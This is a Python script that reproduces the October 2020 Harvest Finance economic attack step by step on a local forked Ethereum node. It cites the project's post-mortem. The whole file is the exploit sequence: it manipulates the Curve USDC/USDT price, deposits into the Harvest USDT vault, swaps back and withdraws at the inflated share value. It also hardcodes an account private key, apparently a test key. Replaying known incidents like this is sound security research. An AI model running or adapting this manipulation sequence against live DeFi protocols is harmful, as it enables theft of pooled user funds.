from web3 import Web3

from contracts.CurveVyperContract import CurveVyperContract
from contracts.HarvestUSDTVaultContract import HarvestUSDTVaultContract
from contracts.TetherTokenContract import TetherTokenContract
from contracts.USDCTokenContract import USDCTokenContract
from models.Account import Account


# https://medium.com/harvest-finance/harvest-flashloan-economic-attack-post-mortem-3cf900d65217
def reproduce_20201026_harvest_finance() -> None:
    """
    Suggested environment:
    block number: 11129512,
    timestamp: 1603681287000.
    """

    web3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))

    print("Block number:", web3.eth.block_number)

    caller = Account(web3, '0x90442730D2b34574a025c972Ca88fE72787f3DB6',
                     '0x66895af6dc0e21aef91b61bdb8c9a20aad56845680319d3c958dc360f2eadcea')

    usdc_token_contract = USDCTokenContract(web3)
    tether_token_contract = TetherTokenContract(web3)
    curve_vyper_contract = CurveVyperContract(web3)
    harvest_usdt_vault_contract = HarvestUSDTVaultContract(web3)

    # 1. Approve Vyper to call USDC balance
    print("1. Approve Vyper to call USDC balance")
    receipt = usdc_token_contract.approve(caller, curve_vyper_contract.get_address(), 10000000000000000)
    print(receipt)

    # 2. Swap USDC for USDT at Vyper
    print("2. Swap USDC for USDT at Vyper")
    receipt = curve_vyper_contract.exchange_underlying(caller, 1, 2, 11425651360209, 11407812062025)
    print(receipt)

    # Check fUSDT balance
    print("Check fUSDT balance")
    result = harvest_usdt_vault_contract.balanceOf(caller.get_address())
    print(result)

    # 3. Approve HarvestUSDTVault to call USDT balance
    print("3. Approve HarvestUSDTVault to call USDT balance")
    receipt = tether_token_contract.approve(caller, harvest_usdt_vault_contract.get_address(), 10000000000000000)
    print(receipt)

    # 4. Approve HarvestUSDTVault to call HarvestUSDTVault balance
    print("4. Approve HarvestUSDTVault to call HarvestUSDTVault balance")
    receipt = harvest_usdt_vault_contract.approve(caller, harvest_usdt_vault_contract.get_address(), 10000000000000000)
    print(receipt)

    # 5. Deposit USDT to HarvestUSDTVault
    print("5. Deposit USDT to HarvestUSDTVault")
    receipt = harvest_usdt_vault_contract.deposit(caller, 60666288631146)
    print(receipt)

    # Check fUSDT balance
    print("Check fUSDT balance")
    result = harvest_usdt_vault_contract.balanceOf(caller.get_address())
    print(result)

    # 6. Approve Vyper to call USDT balance
    print("6. Approve Vyper to call USDT balance")
    receipt = tether_token_contract.approve(caller, curve_vyper_contract.get_address(), 10000000000000000)
    print(receipt)

    # 7. Swap USDT back to USDC at Vyper
    print("7. Swap USDT back to USDC at Vyper")
    receipt = curve_vyper_contract.exchange_underlying(caller, 2, 1, 11437077011569, 11445780907417)
    print(receipt)

    # 8. Withdraw fUSDT from HarvestUSDTVault
    print("8. Withdraw fUSDT from HarvestUSDTVault")
    fUSDT_balance = harvest_usdt_vault_contract.balanceOf(caller.get_address())
    receipt = harvest_usdt_vault_contract.withdraw(caller, fUSDT_balance)
    print(receipt)


if __name__ == '__main__':
    reproduce_20201026_harvest_finance()
